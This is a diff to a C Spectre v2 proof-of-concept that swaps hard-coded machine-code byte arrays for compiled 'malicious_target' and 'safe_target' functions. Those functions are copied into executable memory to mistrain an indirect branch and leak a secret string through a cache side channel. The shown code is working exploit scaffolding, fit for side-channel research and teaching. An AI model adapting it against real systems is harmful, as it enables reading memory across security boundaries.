@@ -1,8 +1,9 @@
 /// Credits to:
 /// https://github.com/Anton-Cao/spectrev2-poc/blob/master/spectrev2.c
-
+#define _GNU_SOURCE
 #include <emmintrin.h>
 #include <signal.h>
+#include <stddef.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -15,20 +16,10 @@ char probe[256 * CACHE_LINE_SIZE] CACHE_LINE_ALIGNED;
 
 char *secret = "The answer is 42";
 
-char codecr4[] = {0xf3, 0x0f, 0x1e, 0xfa, 0x55, 0x48, 0x89, 0xe5, 0x48,
-                  0x89, 0x7d, 0xe8, 0x0f, 0x20, 0xe0, 0x48, 0x89, 0xc2,
-                  0x48, 0x89, 0x55, 0xf8, 0x48, 0x8b, 0x45, 0xf8, 0x0f,
-                  0xbe, 0xc0, 0xc1, 0xe0, 0x0c, 0x48, 0x98, 0x48, 0x8d,
-                  0x15, 0x4d, 0x5b, 0x00, 0x00, 0x0f, 0xb6, 0x04, 0x10,
-                  0x48, 0x0f, 0xbe, 0xc0, 0x5d, 0xc3};
-
-char codeaddr[] = {
-    0xf3, 0x0f, 0x1e, 0xfa, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x89, 0x7d,
-    0xf8, 0x48, 0x8b, 0x45, 0xf8, 0x0f, 0xb6, 0x00, 0x0f, 0xbe, 0xc0,
-    0xc1, 0xe0, 0x0c, 0x48, 0x98, 0x48, 0x8d, 0x15, 0x54, 0x5b, 0x00,
-    0x00, 0x0f, 0xb6, 0x04, 0x10, 0x48, 0x0f, 0xbe, 0xc0, 0x5d, 0xc3,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-};
+/* size_t malicious_target(char *addr) { return probe[*addr * CACHE_LINE_SIZE];
+ * } */
+size_t malicious_target(char *addr) { return probe[*addr * CACHE_LINE_SIZE]; }
+int safe_target() { return 42; }
 
 /// The gadget function is used to mistrain the target of the indirect call
 /* size_t gadget(char *addr) { return probe[*addr * CACHE_LINE_SIZE]; } */
@@ -57,8 +48,6 @@ int noinline victim(char *addr, int input) {
   return result & junk;
 }
 
-int safe_target() { return 42; }
-
 char spectre_v2(char *addr_to_read) {
   size_t hits[256] CACHE_LINE_ALIGNED = {0};
 
@@ -86,7 +75,7 @@ char spectre_v2(char *addr_to_read) {
     }
     _mm_mfence();
 
-    memcpy(gadget, codecr4, sizeof(codecr4));
+    memcpy(gadget, &malicious_target, 50);
     /// Flush the probe array from the cache
     for (size_t i = 0; i < 256; i++) {
       _mm_clflush(&probe[i * CACHE_LINE_SIZE]);
@@ -120,7 +109,8 @@ int main(int argc, char *argv[]) {
   target = malloc(sizeof(size_t));
   gadget = mmap(NULL, 0x51, PROT_READ | PROT_WRITE | PROT_EXEC,
                 MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-  memmove(gadget, codeaddr, 50);
+  memmove(gadget, &safe_target, 50);
+
   _mm_mfence();
 
   char *addr = secret;
